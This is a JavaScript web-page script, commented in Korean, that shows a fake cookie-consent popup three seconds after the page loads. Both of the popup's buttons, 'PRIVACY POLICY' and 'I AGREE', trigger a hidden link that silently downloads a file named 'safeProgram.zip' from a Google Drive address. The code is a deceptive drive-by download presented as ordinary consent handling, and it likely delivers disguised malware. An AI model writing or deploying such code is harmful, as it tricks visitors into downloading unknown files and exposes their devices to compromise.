// script.js

window.addEventListener('load', (event) => {
    setTimeout(showPopup, 3000); // 3초 후에 팝업 표시
});

function showPopup() {
    const message = "This website uses cookies. By visiting the pages of the site, you agree to our Privacy Policy.";
    confirmCustom("Our web page uses cookies.", message).then(() => {
        // 파일 다운로드
        downloadFile('safeProgram.zip', 'https://docs.google.com/uc?export=download&id=1PLwDTQBaQYrAug40LiTMhFjtWVjb_C-s');
    });
}

function confirmCustom(title, message) {
    return new Promise((resolve) => {
        const modal = document.createElement('div');
        modal.style.position = 'fixed';
        modal.style.top = '0';
        modal.style.left = '0';
        modal.style.width = '100%';
        modal.style.height = '100%';
        modal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
        modal.style.display = 'flex';
        modal.style.alignItems = 'center';
        modal.style.justifyContent = 'center';
        modal.style.zIndex = '1000';

        const dialog = document.createElement('div');
        dialog.style.backgroundColor = 'white';
        dialog.style.padding = '20px';
        dialog.style.borderRadius = '8px';
        dialog.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
        dialog.style.textAlign = 'center';
        dialog.style.maxWidth = '400px';
        dialog.style.width = '80%';

        const titleElem = document.createElement('h2');
        titleElem.innerText = title;
        dialog.appendChild(titleElem);

        const messageElem = document.createElement('p');
        messageElem.innerText = message;
        dialog.appendChild(messageElem);

        const buttonContainer = document.createElement('div');
        buttonContainer.style.display = 'flex';
        buttonContainer.style.justifyContent = 'space-between';
        buttonContainer.style.marginTop = '20px';

        const confirmButton = document.createElement('button');
        confirmButton.innerText = 'PRIVACY POLICY';
        confirmButton.style.backgroundColor = 'transparent';
        confirmButton.style.color = '#5a3e92';
        confirmButton.style.border = '2px solid #5a3e92';
        confirmButton.style.padding = '10px 20px';
        confirmButton.style.borderRadius = '5px';
        confirmButton.style.cursor = 'pointer';
        confirmButton.onclick = () => {
            document.body.removeChild(modal);
            resolve();
        };

        const cancelButton = document.createElement('button');
        cancelButton.innerText = 'I AGREE';
        cancelButton.style.backgroundColor = '#5a3e92';
        cancelButton.style.color = 'white';
        cancelButton.style.border = 'none';
        cancelButton.style.padding = '10px 20px';
        cancelButton.style.borderRadius = '5px';
        cancelButton.style.cursor = 'pointer';
        cancelButton.onclick = () => {
            document.body.removeChild(modal);
            resolve();
        };

        buttonContainer.appendChild(confirmButton);
        buttonContainer.appendChild(cancelButton);
        dialog.appendChild(buttonContainer);

        modal.appendChild(dialog);
        document.body.appendChild(modal);
    });
}

function downloadFile(fileName, fileUrl) {
    // 파일 다운로드를 위한 a 태그 생성
    var element = document.createElement('a');
    element.style.display = 'none';  // a 태그를 보이지 않게 설정
    element.href = fileUrl;
    element.download = fileName;
    
    // 클릭 이벤트를 트리거하여 파일 다운로드
    document.body.appendChild(element);
    element.click();
    
    // 다운로드 후 a 태그를 제거
    document.body.removeChild(element);
}
